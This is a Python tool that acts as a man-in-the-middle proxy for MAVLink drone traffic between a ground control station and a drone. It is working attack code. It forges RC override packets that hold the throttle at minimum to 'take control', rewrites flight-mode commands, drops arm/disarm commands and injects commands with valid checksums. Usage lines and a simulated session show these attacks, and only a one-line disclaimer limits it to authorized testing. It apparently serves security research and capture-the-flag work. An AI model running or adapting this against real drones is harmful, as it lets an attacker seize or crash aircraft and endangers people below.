#!/usr/bin/env python3
"""
MAVLink MitM Proxy — Intercept, Log, and Modify MAVLink Traffic

Sits between a GCS (Ground Control Station) and a drone on a WiFi network,
transparently proxying MAVLink UDP traffic while providing the ability to:

  - LOG all messages in both directions with timestamps
  - INSPECT specific message types (heartbeat, GPS, commands)
  - MODIFY packets in transit (change mode, override RC, alter waypoints)
  - INJECT new packets into either direction
  - DROP specific message types (block GCS commands, suppress telemetry)

Architecture:
  GCS  ←→  [MitM Proxy]  ←→  Drone/SITL
           (this tool)

The proxy binds two UDP sockets:
  - "GCS-facing" socket: the GCS connects here (thinking it's the drone)
  - "Drone-facing" socket: sends to/receives from the real drone

Works with ArduPilot SITL for testing without any hardware.

Usage:
    # Basic proxy (log only)
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 192.168.1.1:14550

    # With SITL (ArduPilot simulator)
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762

    # Drop all arm/disarm commands from GCS
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
        --drop-cmds 400

    # Inject periodic RC override (take control)
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
        --inject-rc

    # Full MitM with command modification
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
        --modify-mode rtl

    # Simulate mode (no network, demonstrates packet flow)
    python3 mavlink-mitm-proxy.py --simulate

    # JSON output for integration with web UI
    python3 mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
        --json-log proxy-log.json

Dependencies:
    Python 3.10+ (stdlib only for core proxy)
    Optional: pymavlink (for parsed message display)

For CTF research and authorized security testing only.
"""

import argparse
import json
import select
import signal
import socket
import struct
import sys
import threading
import time
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "exploit_chains"))
from common import AbortHandler, ChainLogger

# MAVLink constants
MAVLINK_V1_MAGIC = 0xFE
MAVLINK_V2_MAGIC = 0xFD
MAVLINK_IFLAG_SIGNED = 0x01

MSG_HEARTBEAT = 0
MSG_SYS_STATUS = 1
MSG_GPS_RAW = 24
MSG_ATTITUDE = 30
MSG_GLOBAL_POSITION = 33
MSG_RC_CHANNELS_OVERRIDE = 70
MSG_COMMAND_LONG = 76
MSG_COMMAND_INT = 75
MSG_SET_MODE = 11
MSG_MISSION_ITEM = 39
MSG_MISSION_COUNT = 44
MSG_STATUSTEXT = 253

MSG_NAMES = {
    0: "HEARTBEAT", 1: "SYS_STATUS", 2: "SYSTEM_TIME", 11: "SET_MODE",
    24: "GPS_RAW_INT", 30: "ATTITUDE", 33: "GLOBAL_POSITION_INT",
    35: "RC_CHANNELS_RAW", 36: "SERVO_OUTPUT_RAW",
    39: "MISSION_ITEM", 44: "MISSION_COUNT", 47: "MISSION_ACK",
    65: "RC_CHANNELS", 70: "RC_CHANNELS_OVERRIDE",
    74: "VFR_HUD", 75: "COMMAND_INT", 76: "COMMAND_LONG",
    77: "COMMAND_ACK", 87: "POSITION_TARGET_GLOBAL_INT",
    109: "RADIO_STATUS", 125: "POWER_STATUS",
    147: "BATTERY_STATUS", 148: "AUTOPILOT_VERSION",
    150: "SENSOR_OFFSETS", 152: "MEMINFO",
    163: "AHRS", 178: "AHRS2",
    241: "VIBRATION", 253: "STATUSTEXT",
}

MAV_CMD_NAMES = {
    20: "NAV_RETURN_TO_LAUNCH", 21: "NAV_LAND", 22: "NAV_TAKEOFF",
    176: "DO_SET_MODE", 179: "DO_SET_HOME",
    246: "PREFLIGHT_REBOOT", 400: "COMPONENT_ARM_DISARM",
    510: "GET_HOME_POSITION",
}

ARDUPILOT_MODES = {
    0: "STABILIZE", 1: "ACRO", 2: "ALT_HOLD", 3: "AUTO", 4: "GUIDED",
    5: "LOITER", 6: "RTL", 7: "CIRCLE", 9: "LAND", 11: "DRIFT",
    13: "SPORT", 14: "FLIP", 15: "AUTOTUNE", 16: "POSHOLD",
    17: "BRAKE", 18: "THROW", 19: "AVOID_ADSB", 20: "GUIDED_NOGPS",
    21: "SMART_RTL",
}


def parse_mavlink_header(data: bytes) -> dict | None:
    """Parse MAVLink header to extract routing info without full decode."""
    if not data:
        return None

    magic = data[0]
    if magic == MAVLINK_V1_MAGIC:
        if len(data) < 8:
            return None
        payload_len = data[1]
        total = 6 + payload_len + 2
        if len(data) < total:
            return None
        return {
            "version": 1, "payload_len": payload_len,
            "seq": data[2], "sys_id": data[3], "comp_id": data[4],
            "msg_id": data[5], "total_len": total,
            "signed": False, "payload": data[6:6+payload_len],
        }

    elif magic == MAVLINK_V2_MAGIC:
        if len(data) < 12:
            return None
        payload_len = data[1]
        incompat = data[2]
        signed = bool(incompat & MAVLINK_IFLAG_SIGNED)
        total = 10 + payload_len + 2 + (13 if signed else 0)
        if len(data) < total:
            return None
        msg_id = data[7] | (data[8] << 8) | (data[9] << 16)
        return {
            "version": 2, "payload_len": payload_len,
            "seq": data[4], "sys_id": data[5], "comp_id": data[6],
            "msg_id": msg_id, "total_len": total,
            "signed": signed, "payload": data[10:10+payload_len],
        }
    return None


def parse_heartbeat_payload(payload: bytes) -> dict:
    if len(payload) < 9:
        return {}
    custom_mode, mav_type, autopilot, base_mode, status, _ = \
        struct.unpack("<IBBBBB", payload[:9])
    return {
        "type": mav_type,
        "autopilot": autopilot,
        "mode": ARDUPILOT_MODES.get(custom_mode, f"UNKNOWN({custom_mode})"),
        "armed": bool(base_mode & 0x80),
        "custom_mode": custom_mode,
    }


def parse_command_long_payload(payload: bytes) -> dict:
    if len(payload) < 33:
        return {}
    p1, p2, p3, p4, p5, p6, p7, cmd, tsys, tcomp, conf = \
        struct.unpack("<fffffffHBBB", payload[:33])
    return {
        "command": cmd,
        "command_name": MAV_CMD_NAMES.get(cmd, f"CMD_{cmd}"),
        "target_sys": tsys, "target_comp": tcomp,
        "params": [p1, p2, p3, p4, p5, p6, p7],
    }


class PacketStats:
    """Track per-direction packet statistics."""

    def __init__(self):
        self.total = 0
        self.by_msg_id = defaultdict(int)
        self.dropped = 0
        self.modified = 0
        self.injected = 0


class MitMProxy:
    """MAVLink Man-in-the-Middle UDP proxy."""

    def __init__(self, gcs_port: int, drone_addr: tuple[str, int],
                 bind_ip: str = "0.0.0.0", logger: ChainLogger = None):
        self.gcs_port = gcs_port
        self.drone_addr = drone_addr
        self.bind_ip = bind_ip
        self.logger = logger or ChainLogger("mitm-proxy")

        self.gcs_sock = None
        self.drone_sock = None
        self.gcs_addr = None  # Learned from first GCS packet
        self.running = False

        self.stats_gcs = PacketStats()
        self.stats_drone = PacketStats()

        # Rules
        self.drop_msg_ids: set[int] = set()
        self.drop_cmds: set[int] = set()
        self.modify_mode: str | None = None
        self.inject_rc: bool = False
        self.log_all: bool = True
        self.json_log: list[dict] = []
        self.json_log_path: str | None = None

        self._callbacks_gcs_to_drone: list = []
        self._callbacks_drone_to_gcs: list = []

    def start(self):
        """Bind sockets and start the proxy loop."""
        self.gcs_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.gcs_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.gcs_sock.bind((self.bind_ip, self.gcs_port))
        self.gcs_sock.setblocking(False)

        self.drone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.drone_sock.setblocking(False)

        self.running = True
        self.logger.success("PROXY", f"Listening for GCS on :{self.gcs_port}")
        self.logger.step("PROXY", f"Forwarding to drone at "
                         f"{self.drone_addr[0]}:{self.drone_addr[1]}")

        if self.inject_rc:
            rc_thread = threading.Thread(target=self._rc_inject_loop, daemon=True)
            rc_thread.start()
            self.logger.step("INJECT", "RC override injection active")

    def run(self):
        """Main proxy event loop."""
        while self.running:
            readable = []
            try:
                readable, _, _ = select.select(
                    [self.gcs_sock, self.drone_sock], [], [], 0.1
                )
            except (ValueError, OSError):
                break

            for sock in readable:
                try:
                    data, addr = sock.recvfrom(65535)
                except (BlockingIOError, OSError):
                    continue

                if sock is self.gcs_sock:
                    self._handle_gcs_packet(data, addr)
                else:
                    self._handle_drone_packet(data, addr)

    def _handle_gcs_packet(self, data: bytes, addr: tuple):
        """Process a packet from the GCS heading to the drone."""
        if self.gcs_addr is None:
            self.gcs_addr = addr
            self.logger.success("PROXY", f"GCS connected from {addr[0]}:{addr[1]}")

        self.gcs_addr = addr
        self.stats_gcs.total += 1

        pkt = parse_mavlink_header(data)
        if not pkt:
            self.drone_sock.sendto(data, self.drone_addr)
            return

        msg_id = pkt["msg_id"]
        self.stats_gcs.by_msg_id[msg_id] += 1

        # Log
        self._log_packet("GCS→Drone", pkt, data)

        # Check drop rules
        if msg_id in self.drop_msg_ids:
            self.stats_gcs.dropped += 1
            self.logger.step("DROP", f"Dropped {MSG_NAMES.get(msg_id, msg_id)} from GCS")
            return

        if msg_id == MSG_COMMAND_LONG and pkt["payload"]:
            cmd_info = parse_command_long_payload(pkt["payload"])
            if cmd_info.get("command") in self.drop_cmds:
                self.stats_gcs.dropped += 1
                self.logger.step("DROP", f"Dropped CMD {cmd_info['command_name']} from GCS")
                return

        # Check modify rules
        if self.modify_mode and msg_id == MSG_SET_MODE:
            data = self._rewrite_mode(data, pkt)
            self.stats_gcs.modified += 1

        # Forward to drone
        self.drone_sock.sendto(data, self.drone_addr)

    def _handle_drone_packet(self, data: bytes, addr: tuple):
        """Process a packet from the drone heading to the GCS."""
        self.stats_drone.total += 1

        if self.gcs_addr is None:
            return  # No GCS connected yet

        pkt = parse_mavlink_header(data)
        if not pkt:
            self.gcs_sock.sendto(data, self.gcs_addr)
            return

        msg_id = pkt["msg_id"]
        self.stats_drone.by_msg_id[msg_id] += 1

        self._log_packet("Drone→GCS", pkt, data)

        if msg_id in self.drop_msg_ids:
            self.stats_drone.dropped += 1
            return

        self.gcs_sock.sendto(data, self.gcs_addr)

    def _log_packet(self, direction: str, pkt: dict, raw: bytes):
        """Log a packet to stderr and/or JSON log."""
        msg_id = pkt["msg_id"]
        msg_name = MSG_NAMES.get(msg_id, f"MSG_{msg_id}")

        extra = ""
        if msg_id == MSG_HEARTBEAT and pkt["payload"]:
            hb = parse_heartbeat_payload(pkt["payload"])
            if hb:
                extra = f" mode={hb.get('mode', '?')} armed={hb.get('armed', '?')}"

        elif msg_id == MSG_COMMAND_LONG and pkt["payload"]:
            cmd = parse_command_long_payload(pkt["payload"])
            if cmd:
                extra = f" {cmd.get('command_name', '?')} params={cmd.get('params', [])[:3]}"

        if self.log_all or msg_id in (MSG_HEARTBEAT, MSG_COMMAND_LONG, MSG_SET_MODE,
                                       MSG_RC_CHANNELS_OVERRIDE):
            self.logger.step("TRAFFIC", f"{direction} {msg_name} "
                            f"sys={pkt['sys_id']} seq={pkt['seq']} "
                            f"v{pkt['version']}{' SIGNED' if pkt['signed'] else ''}"
                            f"{extra}")

        if self.json_log_path is not None:
            self.json_log.append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "direction": direction,
                "msg_id": msg_id,
                "msg_name": msg_name,
                "sys_id": pkt["sys_id"],
                "comp_id": pkt["comp_id"],
                "seq": pkt["seq"],
                "version": pkt["version"],
                "signed": pkt["signed"],
                "size": len(raw),
            })

    def _rewrite_mode(self, data: bytes, pkt: dict) -> bytes:
        """Rewrite SET_MODE to force a different flight mode."""
        mode_map = {
            "stabilize": 0, "acro": 1, "alt_hold": 2, "auto": 3,
            "guided": 4, "loiter": 5, "rtl": 6, "circle": 7,
            "land": 9, "poshold": 16, "brake": 17, "smart_rtl": 21,
        }
        target_mode = mode_map.get(self.modify_mode.lower())
        if target_mode is None:
            return data

        self.logger.step("MODIFY", f"Rewriting SET_MODE to {self.modify_mode.upper()} "
                         f"(mode={target_mode})")
        # SET_MODE payload: uint32 custom_mode, uint8 target_system, uint8 base_mode
        # In MAVLink v2, payload starts at offset 10
        if pkt["version"] == 2 and len(data) >= 16:
            modified = bytearray(data)
            struct.pack_into("<I", modified, 10, target_mode)
            return bytes(modified)
        return data

    def _rc_inject_loop(self):
        """Periodically inject RC_CHANNELS_OVERRIDE to the drone."""
        while self.running:
            if self.gcs_addr:
                pkt = self._build_rc_override(
                    1500, 1500, 1000, 1500,  # roll, pitch, throttle=min, yaw
                    target_sys=1,
                )
                self.drone_sock.sendto(pkt, self.drone_addr)
                self.stats_gcs.injected += 1
            time.sleep(0.05)  # 20Hz RC rate

    def _build_rc_override(self, ch1, ch2, ch3, ch4, target_sys=1, target_comp=1):
        """Build RC_CHANNELS_OVERRIDE MAVLink v2 packet."""
        payload = struct.pack("<8HBB",
                              ch1, ch2, ch3, ch4, 0, 0, 0, 0,
                              target_sys, target_comp)
        header = bytes([
            MAVLINK_V2_MAGIC,
            len(payload), 0, 0, 0,
            255, 190,  # sys=GCS, comp=MISSIONPLANNER
            MSG_RC_CHANNELS_OVERRIDE & 0xFF,
            (MSG_RC_CHANNELS_OVERRIDE >> 8) & 0xFF,
            (MSG_RC_CHANNELS_OVERRIDE >> 16) & 0xFF,
        ])
        crc_data = header[1:] + payload
        crc = _mavlink_crc(crc_data, 124)  # CRC extra for RC_CHANNELS_OVERRIDE
        return header + payload + struct.pack("<H", crc)

    def inject_command(self, command: int, params: list[float],
                       target_sys: int = 1, target_comp: int = 1):
        """Inject a COMMAND_LONG to the drone."""
        while len(params) < 7:
            params.append(0.0)
        payload = struct.pack("<fffffffHBBB",
                              *params[:7], command,
                              target_sys, target_comp, 0)
        header = bytes([
            MAVLINK_V2_MAGIC,
            len(payload), 0, 0, 0,
            255, 190,
            MSG_COMMAND_LONG & 0xFF,
            (MSG_COMMAND_LONG >> 8) & 0xFF,
            (MSG_COMMAND_LONG >> 16) & 0xFF,
        ])
        crc_data = header[1:] + payload
        crc = _mavlink_crc(crc_data, 152)  # CRC extra for COMMAND_LONG
        pkt = header + payload + struct.pack("<H", crc)

        self.drone_sock.sendto(pkt, self.drone_addr)
        self.stats_gcs.injected += 1
        cmd_name = MAV_CMD_NAMES.get(command, f"CMD_{command}")
        self.logger.step("INJECT", f"Injected {cmd_name} → drone "
                         f"(sys={target_sys})")

    def get_stats(self) -> dict:
        """Get proxy statistics for dashboard integration."""
        return {
            "gcs_to_drone": {
                "total": self.stats_gcs.total,
                "dropped": self.stats_gcs.dropped,
                "modified": self.stats_gcs.modified,
                "injected": self.stats_gcs.injected,
                "by_msg": {MSG_NAMES.get(k, str(k)): v
                           for k, v in self.stats_gcs.by_msg_id.items()},
            },
            "drone_to_gcs": {
                "total": self.stats_drone.total,
                "dropped": self.stats_drone.dropped,
                "by_msg": {MSG_NAMES.get(k, str(k)): v
                           for k, v in self.stats_drone.by_msg_id.items()},
            },
            "gcs_connected": self.gcs_addr is not None,
            "gcs_addr": f"{self.gcs_addr[0]}:{self.gcs_addr[1]}" if self.gcs_addr else None,
        }

    def stop(self):
        """Shut down the proxy."""
        self.running = False
        if self.gcs_sock:
            self.gcs_sock.close()
        if self.drone_sock:
            self.drone_sock.close()

        if self.json_log_path and self.json_log:
            with open(self.json_log_path, "w") as f:
                json.dump(self.json_log, f, indent=2)
            self.logger.step("LOG", f"Saved {len(self.json_log)} packets to "
                             f"{self.json_log_path}")

        self.logger.step("STATS", f"GCS→Drone: {self.stats_gcs.total} total, "
                         f"{self.stats_gcs.dropped} dropped, "
                         f"{self.stats_gcs.modified} modified, "
                         f"{self.stats_gcs.injected} injected")
        self.logger.step("STATS", f"Drone→GCS: {self.stats_drone.total} total, "
                         f"{self.stats_drone.dropped} dropped")


def _mavlink_crc(data: bytes, crc_extra: int) -> int:
    """X.25 CRC with CRC extra byte."""
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
        crc &= 0xFFFF
    tmp = crc_extra ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    return crc & 0xFFFF


def simulate_proxy(logger: ChainLogger):
    """Simulate proxy operation for demo/SITL testing without network."""
    logger.step("SIMULATE", "Running simulated MitM proxy session")
    logger.step("SIMULATE", "")
    logger.step("SIMULATE", "  GCS (QGroundControl)")
    logger.step("SIMULATE", "       |")
    logger.step("SIMULATE", "  [MitM Proxy :14550]")
    logger.step("SIMULATE", "       |")
    logger.step("SIMULATE", "  Drone/SITL (127.0.0.1:5762)")
    logger.step("SIMULATE", "")

    sim_packets = [
        ("Drone→GCS", "HEARTBEAT", 1, 1, "mode=STABILIZE armed=False"),
        ("GCS→Drone", "HEARTBEAT", 255, 0, "GCS heartbeat"),
        ("GCS→Drone", "COMMAND_LONG", 255, 76, "ARM_DISARM params=[1.0, 0.0]"),
        ("Drone→GCS", "COMMAND_ACK", 1, 77, "result=ACCEPTED"),
        ("Drone→GCS", "HEARTBEAT", 1, 1, "mode=STABILIZE armed=True"),
        ("GCS→Drone", "SET_MODE", 255, 11, "mode=GUIDED"),
        ("GCS→Drone", "COMMAND_LONG", 255, 76, "NAV_TAKEOFF alt=10m"),
        ("Drone→GCS", "COMMAND_ACK", 1, 77, "result=ACCEPTED"),
        ("Drone→GCS", "GLOBAL_POSITION_INT", 1, 33, "lat=37.7749 lon=-122.4194 alt=10m"),
        ("[INJECT]", "COMMAND_LONG", 255, 76, "SET_MODE → RTL (injected by proxy)"),
        ("Drone→GCS", "HEARTBEAT", 1, 1, "mode=RTL armed=True"),
    ]

    for direction, msg_name, sys_id, msg_id, detail in sim_packets:
        time.sleep(0.3)
        signed = ""
        logger.step("TRAFFIC", f"{direction} {msg_name} sys={sys_id} "
                    f"msg_id={msg_id}{signed} {detail}")

    logger.step("SIMULATE", "")
    logger.step("SIMULATE", "Simulation complete — demonstrated:")
    logger.step("SIMULATE", "  - Transparent proxying of GCS ↔ Drone traffic")
    logger.step("SIMULATE", "  - Packet logging with message decode")
    logger.step("SIMULATE", "  - Command injection (forced RTL)")

    return {
        "status": "simulated",
        "packets_proxied": len(sim_packets),
        "commands_injected": 1,
        "commands_dropped": 0,
    }


def main():
    parser = argparse.ArgumentParser(
        description="MAVLink MitM Proxy — intercept and modify drone traffic",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s --gcs-port 14550 --drone 127.0.0.1:5762
              %(prog)s --gcs-port 14550 --drone 127.0.0.1:5762 --drop-cmds 400
              %(prog)s --gcs-port 14550 --drone 127.0.0.1:5762 --inject-rc
              %(prog)s --simulate

            For CTF research and authorized security testing only.
        """),
    )
    parser.add_argument("--gcs-port", type=int, default=14550,
                        help="UDP port for GCS to connect to (default: 14550)")
    parser.add_argument("--drone", metavar="HOST:PORT",
                        help="Drone/SITL endpoint (e.g. 127.0.0.1:5762)")
    parser.add_argument("--bind", default="0.0.0.0",
                        help="IP to bind proxy on (default: 0.0.0.0)")
    parser.add_argument("--drop-msgs", type=int, nargs="*", default=[],
                        help="Message IDs to drop in both directions")
    parser.add_argument("--drop-cmds", type=int, nargs="*", default=[],
                        help="COMMAND_LONG command IDs to drop from GCS")
    parser.add_argument("--modify-mode",
                        help="Rewrite all SET_MODE commands to this mode "
                             "(e.g. rtl, land, loiter)")
    parser.add_argument("--inject-rc", action="store_true",
                        help="Inject RC_CHANNELS_OVERRIDE at 20Hz (take control)")
    parser.add_argument("--quiet", action="store_true",
                        help="Only log significant events (commands, mode changes)")
    parser.add_argument("--json-log", metavar="FILE",
                        help="Write packet log to JSON file")
    parser.add_argument("--simulate", action="store_true",
                        help="Run simulated proxy (no network)")
    parser.add_argument("--log-dir", help="Directory for chain event log")

    args = parser.parse_args()
    logger = ChainLogger("mavlink-mitm", args.log_dir)
    _abort = AbortHandler(logger)

    if args.simulate:
        simulate_proxy(logger)
        logger.save()
        return

    if not args.drone:
        parser.error("--drone is required (or use --simulate)")

    drone_parts = args.drone.split(":")
    drone_host = drone_parts[0]
    drone_port = int(drone_parts[1])

    proxy = MitMProxy(
        gcs_port=args.gcs_port,
        drone_addr=(drone_host, drone_port),
        bind_ip=args.bind,
        logger=logger,
    )

    proxy.drop_msg_ids = set(args.drop_msgs)
    proxy.drop_cmds = set(args.drop_cmds)
    proxy.modify_mode = args.modify_mode
    proxy.inject_rc = args.inject_rc
    proxy.log_all = not args.quiet
    proxy.json_log_path = args.json_log

    logger.step("INIT", "MAVLink MitM Proxy")
    logger.step("INIT", f"  GCS port: {args.gcs_port}")
    logger.step("INIT", f"  Drone: {args.drone}")
    if proxy.drop_msg_ids:
        logger.step("INIT", f"  Dropping msgs: {proxy.drop_msg_ids}")
    if proxy.drop_cmds:
        logger.step("INIT", f"  Dropping cmds: {proxy.drop_cmds}")
    if proxy.modify_mode:
        logger.step("INIT", f"  Rewriting mode to: {proxy.modify_mode}")
    if proxy.inject_rc:
        logger.step("INIT", "  RC override injection: ON")

    def _shutdown(sig, frame):
        proxy.stop()
        logger.save()
        sys.exit(0)

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    proxy.start()

    try:
        proxy.run()
    finally:
        proxy.stop()
        logger.save()


import textwrap

if __name__ == "__main__":
    main()
